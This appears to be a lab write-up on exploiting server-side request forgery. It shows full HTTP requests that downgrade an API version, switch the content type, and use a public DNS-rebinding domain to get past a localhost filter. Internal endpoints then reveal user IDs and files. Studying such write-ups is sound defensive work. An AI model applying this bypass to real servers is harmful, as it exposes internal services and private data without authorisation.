# SSRF - DNS Rebinding
## Attack the target
Login in to the lab environment we see three test files, `secret.txt`, `note.txt` and `test.txt`, has already been uploaded to the server. Below we got a searchbar allowing the user to upload additional files from specified URL.

The one paying attention and capturing the login request with Burp would also have noticed a second POST request to the api endpoint `/api/v3/users`. 
```bash
POST /api/v3/users HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 52
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Cookie: uuid_hash=8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed
Connection: keep-alive

{"user_uuid":"5d59daf3-f7cb-4a79-8c69-ec657aebb89a"}
```

### Finding SSRF
Setting up a local http server we can verify that the vulnerable web server can reach and POST the file `test.txt`.

```bash
dev :: ~/labs/h0tak88r » echo "test" > test.txt
dev :: ~/labs/h0tak88r » python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

```bash
## Response
POST /api/v3/upload HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 39
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1:8081
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Cookie: uuid_hash=8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed
Connection: keep-alive

file_url=http://172.17.0.1:8888/test.txt

## Response
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Wed, 23 Apr 2025 12:17:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 5
Connection: close

test
```

This is good. Changing the request to POST local resources from the container gives a error `403 Forbidden` with the error message _"invalid url"_.

Downgrading API version from v3 to v2 give the same result. However playing around with Content-Type conversion where we change the data and header from `x-www-form-urlencoded` to `json` we get another result - _"requests to localhost not allowed"_. The error message indicates that we've **found the SSRF vector**, but are blocked by the application server-side SSRF protection check. 

```bash
## Request
POST /api/v2/upload HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 49
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1:8081
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Cookie: uuid_hash=8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed
Connection: keep-alive

{
"file_url":"http://127.0.0.1:8888/test.txt"
}

## Response
HTTP/1.1 403 FORBIDDEN
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Wed, 23 Apr 2025 12:05:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 34
Connection: close

requests to localhost not allowed
```

### DNS Rebinding
Using [rebinder](https://lock.cmpxchg8b.com/rebinder.html) we can get a legitimate URL to be rebinded to localhost/127.0.0.1/0.0.0.0 which eventually will bypass any server-side SSRF protection checks.

```bash
» dig +short 7f000001.08080808.rbndr.us
8.8.8.8
» dig +short 7f000001.08080808.rbndr.us
127.0.0.1
```

```bash
## Request
POST /api/v2/upload HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 61
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://127.0.0.1:8081
Content-Type: application/json
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Cookie: uuid_hash=8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed
Connection: keep-alive

{
"file_url":"http://7f000001.08080808.rbndr.us/test.txt"
}

## Response
HTTP/1.1 404 NOT FOUND
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Wed, 23 Apr 2025 13:41:02 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 18
Connection: close

resource not found
```

Now we get a error `404 Not Found` and the message _"resource not found"_ - we've successfully bypassed the SSRF protection but the file `test.txt` doesn't exist on the file system.

If we remove the filename and do a request to `http://7f000001.08080808.rbndr.us/` the response shows us the login page. At this point it's all about enumerating the website, but this it will be locally.

### Enumerate api
As we saw at the start, when loging in to the page a API request was made to `/api/v3/users`. This endpoint is requires authentication, however we're able to reach it locally through the SSRF.

```bash
## Request
POST /api/v2/upload HTTP/1.1
Host: 127.0.0.1:8081
Content-Length: 63
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Chromium";v="135", "Not-A.Brand";v="8"
Content-Type: application/json
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:8081
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8081/
Accept-Encoding: gzip, deflate, br
Cookie: uuid_hash=8f282a4de56b5a379083e16339d84cd9bee0f64503f9159c5ca7a89f2484a121cae32d23afed9fc673225e1b1ac4beb468964e832a8ef43a2758a475aa2703ed
Connection: keep-alive

{
"file_url":"http://7f000001.08080808.rbndr.us//api"
}

## Response
HTTP/1.1 200 OK
Server: Werkzeug/3.1.3 Python/3.12.3
Date: Wed, 23 Apr 2025 13:55:36 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 29
Connection: close

/users
/status
/employees
```

```bash
## Request1
...
{"file_url":"http://7f000001.08080808.rbndr.us//api/users"}

## Response1
...
["5d59daf3-f7cb-4a79-8c69-ec657aebb89a","6101363a-f5b3-4a5e-b42f-d801afedd326","2e5acb27-a3bf-46f8-bdad-9557a1983b09","66c4d577-c5f6-4a92-bf0d-d4774d4fd054","03986ebe-9e58-4ecc-9c2a-fe3ffb4fc2ea","fd030a5f-8ac1-4557-aaba-b9cd6db1f6c7","05262283-b53e-4410-8793-21c7eef6ed19"]

## Request2
...
{"file_url":"http://7f000001.08080808.rbndr.us//api/users?uuid=03986ebe-9e58-4ecc-9c2a-fe3ffb4fc2ea"}

## Response2
...
["reminder.txt","super-secret-note.txt"]

## Request3
...
{
"file_url":"http://7f000001.08080808.rbndr.us//api/users?uuid=fd030a5f-8ac1-4557-aaba-b9cd6db1f6c7&file=my-home-address.txt"
}

## Response3
...
I can't remeber it (v_v)
```
